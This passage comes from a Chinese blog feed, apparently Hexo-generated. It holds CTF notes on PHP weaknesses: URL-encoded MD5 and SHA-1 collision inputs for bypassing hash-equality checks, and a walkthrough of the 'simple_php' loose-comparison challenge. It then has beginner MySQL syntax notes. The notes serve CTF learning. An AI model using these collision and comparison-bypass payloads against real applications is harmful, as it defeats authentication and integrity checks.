class="number">24</span>%e8%ab%e6%<span class="number">74</span>%d2%<span class="number">8</span>c%<span class="number">68</span>%<span class="number">06</span>%<span class="number">80</span>%<span class="number">0</span>c%dd%<span class="number">74</span>%ae%<span class="number">31</span>%<span class="number">05</span>%d1%<span class="number">15</span>%<span class="number">7</span>d%c4%<span class="number">5</span>e%bc%<span class="number">0</span>b%<span class="number">0</span>f%<span class="number">21</span>%<span class="number">23</span>%a4%<span class="number">16</span>%<span class="number">7</span>c%<span class="number">17</span>%<span class="number">12</span>%d1%<span class="number">2</span>b%b3%<span class="number">10</span>%b7%<span class="number">37</span>%<span class="number">60</span>%<span class="number">68</span>%d7%cb%<span class="number">35</span>%<span class="number">5</span>a%<span class="number">54</span>%<span class="number">97</span>%<span class="number">08</span>%<span class="number">0</span>d%<span class="number">54</span>%<span class="number">78</span>%<span class="number">49</span>%d0%<span class="number">93</span>%c3%<span class="number">33</span>%fd%<span class="number">1</span>f%<span class="number">0</span>b%<span class="number">35</span>%<span class="number">11</span>%<span class="number">9</span>d%<span class="number">96</span>%<span class="number">1</span>d%ba%<span class="number">64</span>%e0%<span class="number">86</span>%ad%<span class="number">6</span>f%<span class="number">52</span>%<span class="number">98</span>%<span class="number">2</span>d%<span class="number">84</span>%<span class="number">12</span>%<span class="number">77</span>%bb%ab%e8%<span class="number">64</span>%da%a3%<span class="number">65</span>%<span class="number">55</span>%<span class="number">5</span>d%d5%<span class="number">76</span>%<span class="number">55</span>%<span class="number">57</span>%<span class="number">46</span>%<span class="number">6</span>c%<span class="number">89</span>%c9%df%b2%<span class="number">3</span>c%<span class="number">85</span>%<span class="number">97</span>%<span class="number">1</span>e%f6%<span class="number">38</span>%<span class="number">66</span>%c9%<span class="number">17</span>%<span class="number">22</span>%e7%ea%c9%f5%d2%e0%<span class="number">14</span>%d8%<span class="number">35</span>%<span class="number">4</span>f%<span class="number">0</span>a%<span class="number">5</span>c%<span class="number">34</span>%d3%<span class="number">73</span>%a5%<span class="number">98</span>%f7%<span class="number">66</span>%<span class="number">72</span>%aa%<span class="number">43</span>%e3%bd%a2%cd%<span class="number">62</span>%fd%<span class="number">69</span>%<span class="number">1</span>d%<span class="number">34</span>%<span class="number">30</span>%<span class="number">57</span>%<span class="number">52</span>%ab%<span class="number">41</span>%b1%<span class="number">91</span>%<span class="number">65</span>%f2%<span class="number">30</span>%<span class="number">7</span>f%cf%c6%a1%<span class="number">8</span>c%fb%dc%c4%<span class="number">8</span>f%<span class="number">61</span>%a5%<span class="number">93</span>%<span class="number">40</span>%<span class="number">1</span>a%<span class="number">13</span>%d1%<span class="number">09</span>%c5%e0%f7%<span class="number">87</span>%<span class="number">5</span>f%<span class="number">48</span>%e7%d7%b3%<span class="number">62</span>%<span class="number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="number">3</span>b%<span class="number">74</span>%<span class="number">28</span>%<span class="number">1</span>c%<span class="number">96</span>%<span class="number">8</span>e%<span class="number">09</span>%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">9</span>b%a6%<span class="number">2</span>f%ed%b7%<span class="number">99</span>%d5%b9%<span class="number">05</span>%<span class="number">39</span>%<span class="number">95</span>%ab</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h3 id="拓-sha1加密的两个相同值"><a href="#拓-sha1加密的两个相同值" class="headerlink" title="拓:sha1加密的两个相同值"></a>拓:sha1加密的两个相同值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array1=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line"></span><br><span class="line">array2=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="MD5-SQL注入（暂未解锁）"><a href="#MD5-SQL注入（暂未解锁）" class="headerlink" title="MD5-SQL注入（暂未解锁）"></a>MD5-SQL注入（暂未解锁）</h3><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a>文章引用</h1><ul><li><p>引用CSDN博主「开心果( ﹡ˆoˆ﹡ )」的原创文章，遵循CC 4.0 BY-SA版权协议</p><p>原文链接：<a href="https://blog.csdn.net/qq_45671431/article/details/105456684">https://blog.csdn.net/qq_45671431/article/details/105456684</a></p></li><li><p>引用CSDN博主「yจุ๊บng」的原创文章，遵循CC 4.0 BY-SA版权协议</p><p>原文链接：<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p></li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h1><h2 id="1-攻防世界-simple-php"><a href="#1-攻防世界-simple-php" class="headerlink" title="1.攻防世界-simple_php"></a>1.攻防世界-simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处使用任意开头不含数字的字符串可使a的相关条件通过。</p><ul><li>第一个条件：由于a是弱比较，此时任意开头不含数字的字符串被当成0进行比价</li><li>第二个条件：a不为空（非空字符串），则条件为真。如果a 是一个空字符串，条件将为假。</li></ul><p>此处使用开头含数字且数字大于1234的字符串可使b的相关条件通过。</p><ul><li>第一个条件：要求b不能是一个数字或者是全由数字构成的字符串</li><li>第二个条件：此时进行若比较，开头含数字且数字大于1234的字符串会被作为数字进行比较</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP&quot;&gt;&lt;a href=&quot;#PHP&quot; class=&quot;headerlink&quot; title=&quot;PHP&quot;&gt;&lt;/a&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;PHP中的比较符&quot;&gt;&lt;a href=&quot;#PHP中的比较符&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-PHP" scheme="https://we11s.github.io/tags/Web-PHP/"/>
    
  </entry>
  
  <entry>
    <title>SQL语句笔记</title>
    <link href="https://we11s.github.io/posts/2587301464/"/>
    <id>https://we11s.github.io/posts/2587301464/</id>
    <published>2023-10-17T23:41:39.000Z</published>
    <updated>2024-01-17T15:10:20.691Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本篇笔记中默认的规则：</strong></p><p><strong>代码中出现<code>[]</code>的部分为可写可不写的</strong></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><table><thead><tr><th>名称</th><th>全称</th><th>简称</th></tr></thead><tbody><tr><td>数据库</td><td>存储数据的仓库，数据是有组织的进行存储</td><td>DataBase (DB)(DBMS)</td></tr><tr><td>数据库管理系统</td><td>操纵和管理数据库的大型软件</td><td>DataBase Management System</td></tr><tr><td>SQL</td><td>操作关系型数据库的编程语言，定义了一套操作关系型数据库统一标准</td><td>Structured Ouery Language (SOL)</td></tr></tbody></table><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><p>概念：建立在关系，模型基础上，由多张相互连接的二维表组成的数据库</p><h2 id="RDBMS-术语"><a href="#RDBMS-术语" class="headerlink" title="RDBMS 术语"></a>RDBMS 术语</h2><ul><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。<ul><li><strong>联合主键</strong>:关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键，这种主键被称为联合主键。对于联合主键，允许一列有重复，只要不是所有主键列都重复即可</li></ul></li><li><strong>外键：</strong>可以把数据与另一张表关联起来,，这种列称为外键。外键用于关联两个表。</li><li><strong>索引：</strong>使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</li><li>表的每一行称为<strong>记录（Record）</strong>，记录是一个逻辑意义上的数据；</li><li>表的每一列称为<strong>字段（Column）</strong>，同一个表的每一行记录都拥有相同的若干字段。</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h1><h2 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a><strong>MySQL 数据类型</strong></h2><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p>标准 SQL 数值数据类型包括严格数值数据类型(<code>INTEGER</code>、<code>SMALLINT</code>、<code>DECIMAL</code> 和 <code>NUMERIC</code>)，以及近似数值数据类型(<code>FLOAT</code>、<code>REAL</code> 和 <code>DOUBLE PRECISION</code>)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号-SIGNED）</th><th align="left">范围（无符号-UNSIGNED）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><p><strong>注</strong>：<code>double</code>的使用规则：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#字段名 <span class="keyword">DOUBLE</span>(总体位数,小数部分位数);如:</span><br><span class="line">score <span class="keyword">DOUBLE</span>(<span class="number">4</span>,<span class="number">1</span>);#小数一位，整数部分最高<span class="number">3</span>位的浮点数</span><br></pre></td></tr></table></figure><h3 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h3><p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01&#x2F;9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901&#x2F;2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><p><strong>注意</strong>：**<code>char(n)</code> 和 <code>varchar(n)</code> 中括号中 n 代表字符的个数，并不代表字节个数，比如 <code>CHAR(30)</code> 就可以存储 30 个字符。**</p><p>CHAR 和 VARCHAR 类型类似，它们在存储和检索数据时有一些区别。</p><ol><li><strong>存储方式</strong>：CHAR类型以固定长度存储数据，而VARCHAR类型以可变长度存储数据。例如，如果定义一个CHAR(10)列，不论实际存储的字符数是多少，它都会占用10个字符的存储空间。而VARCHAR(10)列只会占用实际存储的字符数所需的空间。</li><li><strong>最大长度</strong>：CHAR类型具有固定的最大长度，而VARCHAR类型具有可变的最大长度。例如，如果定义一个CHAR(10)列，它可以存储最多10个字符。而VARCHAR(10)列也可以存储最多10个字符，但它可以根据实际存储的字符数动态调整长度。</li><li><strong>尾部空格</strong>：对于CHAR类型，存储时会在字符串末尾填充空格，以达到指定的固定长度。而VARCHAR类型不会填充空格，它只会存储实际的字符数据。</li><li><strong>性能</strong>：<code>char</code>的性能比<code>varchar</code>更高，无需判断字符串大小</li></ol><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。有时候我们需要存储的数据是二进制形式的，例如图像、音频或加密数据等。在这种情况下，我们可以使用BINARY和VARBINARY类型来保存二进制字符串。也就是说，它们包含<strong>字节</strong>字符串而不是<strong>字符</strong>字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象（如图片、音频、视频等等），可以容纳可变数量的数据。有 4 种 BLOB 类型：<code>TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB</code>。它们区别在于可容纳存储范围不同。</p><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="SQL通用语句"><a href="#SQL通用语句" class="headerlink" title="SQL通用语句"></a>SQL通用语句</h2><ol><li>SQL语句可以单行或多行书写，以分号结尾</li><li>SQL语句可以使用空格(可以是一个也可以是多个)&#x2F;缩进来增强语句的可读性。</li><li>MySQL数据库的SQL语句不区分大小写，关键字建议使用大写<br>注释:<br>单行注释:– 注释内容或# 注释内容(MySQL特有)<br>多行注释: &#x2F;<em>注释内容</em>&#x2F;</li></ol><h2 id="SQL语句分类"><a href="#SQL语句分类" class="headerlink" title="SQL语句分类"></a>SQL语句分类</h2><table><thead><tr><th>分类</th><th>全称</th><th>说明</th></tr></thead><tbody><tr><td>DDL</td><td>Data Definition Language</td><td>数据定义语言，用来定义数据库对象(数据库，表，字段)</td></tr><tr><td>DML</td><td>Data Manipulation Language</td><td>数据操作语言，用来对数据库表中的数据进行增删改</td></tr><tr><td>DQL</td><td>Data Query(查询) Language</td><td>数据查询语言，用来查询数据库中表的记录</td></tr><tr><td>DCL</td><td>Data Control Language</td><td>数据控制语言，用来创建数据库用户、控制数据库的访问权限</td></tr></tbody></table><h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a><strong>DDL</strong></h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p><strong>查询</strong></p><p><strong>查询所有数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure><p><strong>查询当前数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure><p><strong>创建</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE [IF <span class="keyword">NOT</span> EXSITS] 数据库名 [<span class="keyword">DEFAULT</span> CHARSET 字符集（如utf<span class="number">-8</span>、gbk等）] [<span class="keyword">COLLATE</span> 排序规则]；</span><br></pre></td></tr></table></figure><p>注：<code>[IF NOT EXSITS]</code>表明如果数据库不存在则创建，存在则不创建</p><p><strong>删除</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE [IF <span class="keyword">EXISTS</span>] 数据库名；</span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE 数据库名；</span><br></pre></td></tr></table></figure><hr><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a><strong>表操作</strong></h3><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a><strong>查询</strong></h4><p><strong>查询当前数据库的所有表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure><p><strong>查询表结构</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESC</span> 表名;</span><br></pre></td></tr></table></figure><p><strong>查询指定表的建表语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a><strong>创建</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 约束条件 [COMMENT 字段<span class="number">1</span>注释],</span><br><span class="line">字段<span class="number">2</span> 字段<span class="number">2</span>类型 约束条件 [COMMENT 字段<span class="number">2</span>注释],</span><br><span class="line">字段<span class="number">3</span> 字段<span class="number">3</span>类型 约束条件 [COMMENT 字段<span class="number">3</span>注释],</span><br><span class="line">.....</span><br><span class="line">字段n 字段n类型 约束条件 [COMMENT 字段n注释]</span><br><span class="line"></span><br><span class="line">)[COMMENT 表注释];</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><ul><li><strong>最后一个字段不要加<code>,</code>逗号</strong></li><li><strong>注释需要用<code>&#39; &#39;</code></strong></li></ul><h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a><strong>修改</strong></h4><p><strong>添加字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 字段名 类型(长度) [COMMENT 注释] [约束];</span><br></pre></td></tr></table></figure><p><strong>修改字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY 字段名 新数据类型(长度);</span><br></pre></td></tr></table></figure><p><strong>修改字段名和字段类型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 旧字段名 类型(长度) [COMMENT 注释] [注释];</span><br></pre></td></tr></table></figure><p><strong>删除字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br></pre></td></tr></table></figure><p><strong>修改表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 旧表名 RENAME <span class="keyword">TO</span> 新表名</span><br></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a><strong>删除</strong></h4><p><strong>删除表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [IF <span class="keyword">EXISTS</span>] 